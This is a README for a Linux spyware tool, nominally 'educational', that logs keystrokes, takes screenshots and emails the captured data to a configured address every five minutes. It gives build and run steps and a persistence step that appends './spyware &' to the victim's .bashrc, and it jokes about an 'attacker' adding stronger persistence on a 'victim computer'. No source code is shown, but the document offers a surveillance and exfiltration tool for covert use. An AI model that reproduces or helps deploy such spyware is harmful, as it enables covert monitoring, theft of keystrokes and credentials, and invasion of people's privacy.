# Simple Spyware (Educational only)

This program is a spyware application that includes functionalities for keylogging (thanks to `@cyrus-and`), screenshot capturing, and sending data to a server each 5 minutes using the Chilkat library.

## Features

- **Keylogging**: Logs the key entered by the user and saves to `keylog.txt`.
- **Screenshot Capture**: Takes screenshots of the current screen and saves to `screenshot.png`.
- **Data Sending**: Uses the Chilkat library to send the captured data to a server (change `sender email`, `app password` and `recipient email` in `spyware.cpp`).

## Requirements

- Operating System: Linux
- Necessary Libraries:
    - `X11`
    - `Xi`
    - `libpng`
    - `zlib`
    - `Chilkat`

## Installation

### Step 1: Install Libraries

```bash
sudo apt-get install libx11-dev libxi-dev libpng-dev zlib1g-dev
```

### Step 2: Download Chilkat

Download the Chilkat library from its official [website](https://www.chilkatsoft.com/installLinux.asp) and follow the instructions to compile it.

### Step 3: Compile the Program

```bash
make
```

### Step 4: Run the Program

Foreground mode:
```bash
./spyware
```

Background mode (terminated by `kill <PID>`):
```bash
./spyware &
```

### Step 5: Config the persistence

```
sudo nano .bash_rc
```

Add the command to execute at the end:
```
./spyware &
```

P/s: attacker may add some advanced persistence technique that can run in victim computer... xd

## References

- https://github.com/cyrus-and/xkeylogger/blob/master/README.md
- https://github.com/resurrecting-open-source-projects/scrot/blob/master/src/scrot.c
- https://www.codemadness.nl/downloads/xscreenshot.c
- https://www.example-code.com/cpp/smtp_send_email_with_attachments.asp
